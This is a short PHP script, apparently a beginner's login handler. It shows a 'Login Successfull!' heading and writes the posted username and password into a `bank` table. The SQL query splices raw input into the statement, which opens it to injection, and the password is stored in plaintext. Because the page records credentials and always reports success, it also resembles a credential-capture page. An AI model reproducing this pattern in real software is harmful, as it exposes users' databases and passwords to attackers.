<!-- this is one line html code -->
<h1 style="text-align: center;color: green;">Login Successfull!</h1>

<?php
//write code....
//start the coding
require_once "database.php";
$n = $_POST['name'];
$p = $_POST['password'];

$sql = "INSERT INTO `bank`(`Username`, `Password`) VALUES ('$n','$p')";
mysqli_query($all_data, $sql)


?>